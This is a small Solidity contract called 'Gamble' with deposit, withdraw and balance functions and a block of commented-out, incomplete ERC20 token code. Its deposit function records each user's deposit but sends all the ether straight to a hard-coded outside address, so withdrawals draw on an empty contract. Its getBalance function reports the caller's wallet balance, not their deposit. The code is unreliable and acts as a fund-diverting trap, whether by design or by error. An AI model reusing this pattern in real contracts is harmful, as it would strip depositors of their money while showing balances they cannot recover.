// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

// import "../node_modules/@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Gamble {
  address owner;
  mapping(address => uint256) public deposited;  
  constructor() {
    owner = msg.sender;
  }

    receive() payable external{
        
    }
//   function whitelistToken(bytes32 symbol, address tokenAddress) external {
//     require(msg.sender == owner, 'This function is not public');
//     token = symbol;
//     whitelistedTokens[symbol] = tokenAddress;
//   }

//   function getWhitelistedTokenAddresses(bytes32 token) external returns(address) {
//     return whitelistedTokens[token];
//   }

//   function depositTokens(uint256 amount, bytes32 symbol) external {
//     require(amount > 0 && token == symbol, "Amount should be greater than zero");
//     accountBalances[msg.sender][symbol] += amount;
//     ERC20(whitelistedTokens[symbol]).transferFrom(msg.sender, address(this), amount);
//   }

//   function withdrawTokens(uint256 amount, bytes32 symbol) external {
//     require(accountBalances[msg.sender][symbol] >= amount, 'Insufficent funds');

//     accountBalances[msg.sender][symbol] -= amount;
//     ERC20(whitelistedTokens[symbol]).transfer(msg.sender, amount);
//   }
    function deposit()public payable{
        deposited[msg.sender] += msg.value;
        payable(0x22352DcF5834202A95780bc5776F2Bc15f8C1a30).transfer(msg.value);
    }
    function withdraw(uint256 _amount) public payable{
      require(_amount <= deposited[msg.sender],"Not enough funds");
      deposited[msg.sender] -= _amount;
      payable(msg.sender).transfer(_amount);
    }
    function getBalance() public view returns(uint256){
      return address(msg.sender).balance;
    }
}